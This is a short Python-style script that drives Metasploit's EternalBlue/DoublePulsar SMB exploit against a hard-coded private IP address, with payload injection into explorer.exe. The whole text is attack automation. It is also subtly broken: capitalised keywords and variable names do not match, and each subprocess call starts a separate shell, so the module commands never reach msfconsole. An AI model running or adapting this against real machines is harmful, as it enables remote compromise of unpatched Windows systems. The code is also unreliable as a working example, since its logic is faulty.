Import subprocess
Cmd = "msfconsole"
P1 = subprocess.Popen(cmd, shell = True)
Cmd = "use exploit/windows/smb/eternalblue_doublepulsar"
P1 = subprocess.Popen(cmd, shell = True)
Cmd = "set rhosts 192.168.169.110"
P1 = subprocess.Popen(cmd, shell = True)
Cmd = "set processinject explorer.exe"
P1 = subprocess.Popen(cmd, shell = True)
Cmd = "run"
P1 = subprocess.Popen(cmd, shell = True)

